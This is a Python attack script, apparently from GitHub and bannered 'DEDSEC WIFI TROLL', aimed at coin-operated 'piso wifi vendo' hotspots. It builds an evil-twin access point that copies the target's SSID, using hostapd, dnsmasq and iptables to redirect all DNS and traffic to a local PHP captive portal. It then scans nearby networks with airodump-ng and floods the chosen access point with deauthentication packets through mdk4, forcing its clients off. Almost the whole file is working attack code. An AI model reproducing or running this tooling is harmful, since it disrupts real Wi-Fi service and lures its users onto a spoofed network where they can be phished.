 
#coded by 0xbit
import psutil
from tabulate import tabulate
import os, sys
import time
from subprocess import Popen, PIPE, STDOUT
from scapy.all import (Dot11,RadioTap,Dot11Deauth,sendp,send)
import csv

home = os.getcwd()
scanned_path = home+'/.scanned'
DN = open(os.devnull, 'w')
commands = []

if not os.path.exists(scanned_path):
    os.makedirs(scanned_path)

os.chdir(scanned_path)

def check_root():
    os.system('clear')
    if not os.geteuid()==0:
        sys.exit('This script must be run as root!')
    else:
        pid_kill()
        install()

def install():
    print('installing packages...')
    dnsmasq = 'command -v dnsmasq'
    hostapd = 'command -v hostapd'
    if dnsmasq and hostapd == True:
        os.system('apt install hostapd dnsmasq -y')
    else:
        print(tabulate([['already installed']], tablefmt='fancy_grid'))
        time.sleep(1)
        os.system('clear')

def pid_kill():
    os.system('sudo killall hostapd > /dev/null 2>&1')
    os.system('sudo killall dnsmasq > /dev/null 2>&1')
    os.system('sudo killall php > /dev/null 2>&1')

def banner():
    os.system('clear')
    print()
    print('''
    8""""8 8"""" 8""""8 8""""8 8"""" 8""""8    8   8  8 8  8"""" 8     ""8"" 8"""8  8"""88 8     8     
    8    8 8     8    8 8      8     8    "    8   8  8 8  8     8       8   8   8  8    8 8     8     
    8e   8 8eeee 8e   8 8eeeee 8eeee 8e        8e  8  8 8e 8eeee 8e      8e  8eee8e 8    8 8e    8e    
    88   8 88    88   8     88 88    88        88  8  8 88 88    88      88  88   8 8    8 88    88    
    88   8 88    88   8 e   88 88    88   e    88  8  8 88 88    88      88  88   8 8    8 88    88    
    88eee8 88eee 88eee8 8eee88 88eee 88eee8    88ee8ee8 88 88    88      88  88   8 8eeee8 88eee 88eee  

                            TROLL PISO WIFI VENDO USING 2 WIFI ADAPTER                                        
                                      GITHUB: @0XBITX

    ''')

addrs = psutil.net_if_addrs()
inter = list(addrs.keys())

inter_dict = {}
for i, interface in enumerate(inter, start=1):
    inter_dict[i] = interface

def get_wifi():
    os.system('clear')
    banner()
    format = []
    header = ['WIFI ADAPTER NAME']
    format.append(header)
    d = 0
    for element in inter:
        d += 1
        wifi_name = str(element)
        format.append([f'{d}. ' + wifi_name])
    print(tabulate(format, tablefmt='fancy_grid'))
    
    try:
        select = int(input('NO: '))
        if select == select:
            global wname
            wname = inter_dict[select]
        else:
            pass
    except KeyError:
        os.system('clear')
        get_wifi()

class main_code:
    def __init__(self, i_name, w_name, source_i):
        self.i_name = i_name
        self.w_name = w_name
        self.source_i = source_i

    def stop_net(self):
        os.system('systemctl stop NetworkManager.service > /dev/null 2>&1')
    
    def set_w_name(self):
        os.system('mv /etc/spoof.hosts /etc/spoof.bak > /dev/null 2>&1')
        os.system(f'''echo '10.0.0.1 {self.w_name}' > /etc/spoof.hosts''')
    
    def hostapd(self):
        os.system('mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.bak > /dev/null 2>&1')
        with open('/etc/hostapd/hostapd.conf', 'w') as hostapd:
            hostapd.write(f'''interface={self.i_name}\ndriver=nl80211\nssid={self.w_name}\nhw_mode=g\nchannel=11''')
    
    def dnsmasq(self):
        os.system('mv /etc/dnsmasq.conf /etc/dnsmasq.bak > /dev/null 2>&1')
        with open('/etc/dnsmasq.conf', 'a') as dnsmasq:
            dnsmasq.write(f'''no-resolv\ninterface={self.i_name}\ndhcp-range=10.0.0.2,10.0.0.101,12h\nserver=8.8.8.8\nserver=8.8.4.4\ndomain=free.wifi\naddress=/fake.local/10.0.0.1\naddn-hosts=/etc/spoof.hosts\naddress=/#/10.0.0.1''')

    def iptables(self):
        os.system(f'iptables -t mangle -N captiveportal > /dev/null 2>&1')
        os.system(f'iptables -t mangle -A PREROUTING -i {self.i_name} -p udp --dport 53 -j RETURN > /dev/null 2>&1')
        os.system(f'iptables -t mangle -A PREROUTING -i {self.i_name} -j captiveportal > /dev/null 2>&1')
        os.system(f'iptables -t mangle -A captiveportal -j MARK --set-mark 1 > /dev/null 2>&1')
        os.system(f'iptables -t nat -A PREROUTING -i {self.i_name}  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1 > /dev/null 2>&1')
        os.system(f'xterm -e nohup  sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1')
        os.system(f'iptables -A FORWARD -i {self.i_name} -j ACCEPT > /dev/null 2>&1')
        os.system(f'iptables -t nat -A POSTROUTING -o {self.source_i} -j MASQUERADE > /dev/null 2>&1')
        os.system(f'ifconfig {self.i_name} up 10.0.0.1 netmask 255.255.255.0 > /dev/null 2>&1')

    def dnsmasq_start(self):
        os.system('dnsmasq > /dev/null 2>&1')
        os.system('hostapd -B /etc/hostapd/hostapd.conf > /dev/null')
    
    def reset(self):
        print()
        print(tabulate([['RESET SETUP CONFIG']], tablefmt='fancy_grid'))
        os.system('mv /etc/hostapd/hostapd.bak /etc/hostapd/hostapd.conf > /dev/null 2>&1')
        os.system('mv /etc/dnsmasq.bak /etc/dnsmasq.conf > /dev/null 2>&1')
        os.system('mv /etc/spoof.bak /etc/spoof.hosts > /dev/null 2>&1')
        os.system(f'iptables -t mangle -D PREROUTING -i {self.i_name} -p udp --dport 53 -j RETURN > /dev/null 2>&1')
        os.system(f'iptables -t mangle -D PREROUTING -i {self.i_name} -j captiveportal > /dev/null 2>&1')
        os.system('iptables -t mangle -D captiveportal -j MARK --set-mark 1 > /dev/null 2>&1')
        os.system(f'iptables -t nat -D PREROUTING -i {self.i_name}  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1 > /dev/null 2>&1')
        os.system(f'iptables -D FORWARD -i {self.i_name} -j ACCEPT > /dev/null 2>&1')
        os.system(f'iptables -t nat -D POSTROUTING -o {self.source_i} -j MASQUERADE > /dev/null 2>&1')
        os.system('iptables -t nat -F > /dev/null 2>&1')
        os.system('iptables -t nat -X > /dev/null 2>&1')
        os.system('iptables -t mangle -F > /dev/null 2>&1')
        os.system('iptables -t mangle -X > /dev/null 2>&1')
        os.system('systemctl start NetworkManager.service')
        os.system('service networking restart > /dev/null 2>&1')

def php_server():
    banner()
    print()
    os.system(f'cd "{home}/.www" && php -S 10.0.0.1:80 > /dev/null 2>&1 &')

def mon_mode():
    addrs = psutil.net_if_addrs()
    inter = list(addrs.keys())

    inter_dict = {}
    for i, interface in enumerate(inter, start=1):
        inter_dict[i] = interface

    format = []
    header = ['WIFI ADAPTER NAME']
    format.append(header)
    d = 0
    for element in inter:
        d += 1
        wifi_name = str(element)
        format.append([f'{d}. ' + wifi_name])
    print(tabulate(format, tablefmt='fancy_grid'))
    
    try:
        select = int(input('select your second wifi adapter: '))
        if select == select:
            global iface
            iface = inter_dict[select]
            os.system(f'ifconfig {iface} down')
            time.sleep(1)
            os.system(f'iwconfig {iface} mode monitor')
            time.sleep(1)
            os.system(f'ifconfig {iface} up')
        else:
            pass
    except KeyError:
        os.system('clear')
        mon_mode()

def scanAP(iface):
    cmd = ['airodump-ng',iface,'-w','scanned','--output-format','csv']
    for i in os.listdir(scanned_path):
        if 'scanned' in i:
            os.remove(i)
    proc_read = Popen(cmd, stdout=DN, stderr=DN)

    while os.path.exists(scanned_path+"/scanned-01.csv") == False:
        continue
    
    attempts_count = 0
    while True:
        try:
            os.system('clear')
            with open(scanned_path+'/scanned-01.csv') as csv_file:
                csv_reader = csv.reader(csv_file, delimiter=',')
                hit_clients = False
                ssid = None
                output_clients = ""
                bssid_list = []
                ssid_list = []
                channel_list = []
                count = -1

                if output_clients == "":
                    attempts_count += 1
                    print(f'\n  * Starting scan of APs now...\n')
                    if attempts_count/2 > 15:
                        print(f"  * Scanning time exceeded 15sec.\n")

                for row in csv_reader:
                    if len(row) < 2:
                        continue
                    if not hit_clients:
                        if row[0].strip() == 'Station MAC':
                            hit_clients = True
                            continue
                        if len(row) < 14:
                            continue
                        if row[0].strip() == 'BSSID':
                            continue
                        enc = row[5].strip()
                        if len(enc) > 4:
                            enc = enc[4:].strip()

                        bssid = row[0].strip()
                        power = str(row[8].strip())
                        channel = str(row[3].strip())
                        ssid = row[13].strip()
                        ssidlen = int(row[12].strip())
                        ssid = ssid[:ssidlen]
                        count += 1
                        if len(ssid) <= 20:
                            output_clients += f"   [{count}] {ssid.ljust(20)} {channel.rjust(3)}  {enc.ljust(4)} {power.rjust(4)}    {bssid.ljust(10)}\n"
                        else:
                            output_clients += f"   [{count}] {ssid[0:17]}... {channel.rjust(3)}  {enc.ljust(4)} {power.rjust(4)}    {bssid.ljust(10)}\n"
                        
                        bssid_list.append(bssid)
                        ssid_list.append(ssid)
                        channel_list.append(channel)

                    else:
                        if len(row) < 6:
                            continue
                if output_clients != "":
                    os.system('clear')
                    print(f'Press CTRL+C when the target AP appears\n')
                    print(f"   NUM SSID                  CH  ENCR  POWER  BSSID")
                    print(f'   --- --------------------  --  ----  -----  -----------------')
                    print(output_clients)
                csv_file.close()
            time.sleep(0.5)

        except KeyboardInterrupt:
            if ssid is None:
                os.system('clear')
                print(f"\n  * Couldn't catch any AP\n")
                time.sleep(2)
            else:
                selectAP(proc_read, output_clients, bssid_list, ssid_list, channel_list)
            break

def selectAP(proc_read, output_clients, bssid_list, ssid_list, channel_list):
    proc_read.kill()
    os.system('stty sane') # unfreeze terminal
    os.system('clear')
    while True:
        try:
            print(f"   NUM SSID                  CH  ENCR  POWER  BSSID")
            print(f'   --- --------------------  --  ----  -----  -----------------')
            print(output_clients)
            target_id = input(f"Select target AP: ")
            target_id = int(target_id)
            target_bssid = bssid_list[target_id]
            target_ssid = ssid_list[target_id]
            target_channel = channel_list[target_id]
            os.system('clear')
            print(f"\n  * You selected {target_ssid} ({target_bssid}) on channel {target_channel}")
            deauthAP(target_bssid, target_ssid, target_channel, iface)
            break
        except KeyboardInterrupt:
            break

def deauthAP(bssid, ssid, channel, iface):
    try:
        os.system('clear')
        print()
        print(tabulate([[f'Starting deauth attack for {ssid} ({bssid}) on channel {channel}']],tablefmt='fancy_grid'))
        print(f'Press CTRL+C to STOP\n')
        print(f'* Flooding {bssid} on channel {channel} of deauth packets')
        cmd = f'mdk4 {iface} d -c {channel} -B {bssid}'
        os.popen(cmd).read()
    except KeyboardInterrupt:
        reset_second_adapter()
        reset()
        main()

def reset():
     sr = main_code(wname, wifiname, 'lo')
     sr.reset()

def reset_second_adapter():
    os.system(f'ifconfig {iface} down')
    time.sleep(1)
    os.system(f'iwconfig {iface} mode managed')
    time.sleep(1)
    os.system(f'ifconfig {iface} up')

def main(): 
    banner()
    print(tabulate([['1. start'], ['2. EXIT']], tablefmt='fancy_grid'))
    select = int(input('root@dedsec: '))
    if select == 1:
        get_wifi()
        global wifiname
        print()
        wifiname = input('WIFI TARGET NAME: ')
        try:
            sr = main_code(wname, wifiname, 'lo')
            sr.stop_net()
            sr.set_w_name()
            sr.hostapd()
            sr.dnsmasq()
            sr.iptables()
            sr.dnsmasq_start()
            php_server()
            mon_mode()
            scanAP(iface)
            sr.reset()
            main()

        except KeyboardInterrupt:
            sr.reset()
            
    elif select == 2:
        os.system('clear')
        sys.exit('BYE BYE')

check_root()
main()
